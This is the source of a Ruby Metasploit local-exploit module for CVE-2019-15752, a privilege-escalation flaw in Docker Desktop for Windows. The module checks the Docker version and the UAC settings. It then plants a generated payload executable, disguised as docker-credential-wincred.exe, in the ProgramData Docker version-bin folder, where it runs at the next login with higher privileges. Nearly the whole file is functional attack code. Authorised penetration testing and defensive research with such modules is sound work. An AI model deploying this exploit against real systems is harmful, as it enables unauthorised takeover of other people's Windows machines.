# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Docker-Credential-Wincred.exe Privilege Escalation&#039;,
        &#039;Description&#039; => %q{
          This exploit leverages a vulnerability in docker desktop
          community editions prior to 2.1.0.1 where an attacker can write
          a payload to a lower-privileged area to be executed
          automatically by the docker user at login.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; => [
          &#039;Morgan Roman&#039;, # discovery
          &#039;bwatters-r7&#039;, # metasploit module
        ],
        &#039;Platform&#039; => [&#039;win&#039;],
        &#039;Targets&#039; => [[ &#039;Automatic&#039;, {} ]],
        &#039;DefaultTarget&#039; => 0,
        &#039;DefaultOptions&#039; => {
          &#039;WfsDelay&#039; => 15
        },
        &#039;DisclosureDate&#039; => &#039;2019-07-05&#039;,
        &#039;Notes&#039; =>
        {
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK ]
        },
        &#039;References&#039; => [
          [&#039;CVE&#039;, &#039;2019-15752&#039;],
          [&#039;URL&#039;, &#039;https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e&#039;]
        ]
      )
    )
    register_options(
      [OptString.new(&#039;PROGRAMDATA&#039;, [true, &#039;Path to docker version-bin.&#039;, &#039;%PROGRAMDATA%&#039;])]
    )
  end

  def docker_version
    output = cmd_exec(&#039;cmd.exe&#039;, &#039;/c docker -v&#039;)
    vprint_status(output)
    version_string = output.match(/(\d+\.)(\d+\.)(\d)/)[0]
    Gem::Version.new(version_string.split(&#039;.&#039;).map(&:to_i).join(&#039;.&#039;))
  end

  def check
    if docker_version <= Gem::Version.new(&#039;18.09.0&#039;)
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    check_permissions!
    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
                "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting...")
    when UAC_DEFAULT
      print_good(&#039;UAC is set to Default&#039;)
      print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
    when UAC_NO_PROMPT
      print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
      shell_execute_exe
      return
    end

    # make payload
    docker_path = expand_path("#{datastore[&#039;PROGRAMDATA&#039;]}\\DockerDesktop\\version-bin")
    fail_with(Failure::NotFound, &#039;Vulnerable Docker path is not on system&#039;) unless directory?(docker_path)
    payload_name = &#039;docker-credential-wincred.exe&#039;
    payload_pathname = "#{docker_path}\\#{payload_name}"
    vprint_status(&#039;Making Payload&#039;)
    payload = generate_payload_exe

    # upload Payload
    vprint_status("Uploading Payload to #{payload_pathname}")
    write_file(payload_pathname, payload)
    vprint_status(&#039;Payload Upload Complete&#039;)
    print_status(&#039;Waiting for user to attempt to login&#039;)
  end

  def check_permissions!
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?
    # Check if you are an admin
    # is_in_admin_group can be nil, true, or false
  end
end

